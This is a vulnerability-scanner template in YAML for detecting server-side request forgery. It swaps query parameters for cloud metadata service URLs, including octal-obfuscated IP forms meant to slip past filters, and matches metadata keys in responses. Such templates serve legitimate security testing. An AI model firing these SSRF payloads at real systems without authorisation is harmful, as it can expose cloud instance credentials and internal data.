http:
- fuzzing:
  - fuzz:
    - '{{hostval}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - public-ipv4
    - instance-id
    - privateIp
    - 'Missing required header: Metadata-Flavor'
    - azEnvironment
    - droplet_id
    - availabilityDomain
    - compartmentId
  - part: header
    type: word
    words:
    - application/json
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    hostval:
    - http://169.254.169.254/latest/meta-data/
    - http://169.254.169.254/metadata/v1.json
    - http://000169.000254.000169.000254/latest/meta-data/
    - http://000169.000254.000169.000254/metadata/v1.json
    - http://metadata.google.internal/computeMetadata/v1/
    - http://169.254.169.254/metadata/instance?api-version=2019-03-11
    - http://100.100.100.200/latest/meta-data/
    - http://169.254.169.254/metadata/v1/
    - http://169.254.169.254/opc/v1/instance/
    - http://000169.000254.000169.000254/metadata/instance?api-version=2019-03-11
    - http://000100.000100.000100.000200/latest/meta-data/
    - http://000169.000254.000169.000254/metadata/v1/
    - http://000169.000254.000169.000254/opc/v1/instance/
  stop-at-first-match: true
id: metadata-service-ssrf-bypass
info:
  author: reewardius
  description: https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
  name: Metadata Service SSRF bypass
  severity: critical
  tags: fuzzing-ssrf,fuzzing-req,dast
